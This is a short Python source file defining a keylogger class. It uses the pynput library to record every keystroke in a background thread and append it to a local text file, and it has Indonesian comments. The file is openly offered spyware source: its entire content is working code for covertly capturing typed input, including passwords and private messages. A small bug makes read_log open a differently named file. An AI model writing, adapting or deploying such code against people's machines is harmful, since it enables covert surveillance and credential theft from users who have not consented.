from pynput.keyboard import Listener
import threading
import re
import os

class keylogger:
    keys = []
    hitung = 0
    path = 'log_data.txt'

    def start_listener(self):
        global Listener
        with Listener(on_press=self.key_pressed) as Listener:
            Listener.join()

    def start_logger(self):
        self.t = threading.Thread(target=self.start_listener)
        self.t.start()

    def key_pressed(self, key):
        self.keys.append(key)
        self.hitung += 1
        if self.hitung >= 1:
            self.hitung = 0
            with open(self.path, 'a') as file:
                for i in self.keys:
                    i = re.sub("'", "", str(i))
                    if i == "Key.enter":
                        file.write("\n")
                    elif i in ("Key.shift",
                               "Key.shift_r",
                               "Key.ctrl",
                               "Key.escape"):
                        pass
                    elif i == "Key.backspace":
                        file.write(" [backspace] ")
                    elif i == "Key.space":
                        file.write(" ")
                    elif i == "Key.tab":
                        file.write(" [Tab] ")
                    elif i == "Key.caps_lock":
                        file.write(" [Capslock] ")
                    else:
                        file.write(i)
        self.keys = []
# fungsi untuk membaca
    def read_log(self):
        with open('logdata.txt', 'r') as file:
            data = file.read()
            return data
# menghentikan listener
    def stop_listener(self):
        Listener.stop()
        os.remove(self.path)

# keylogger().start_logger()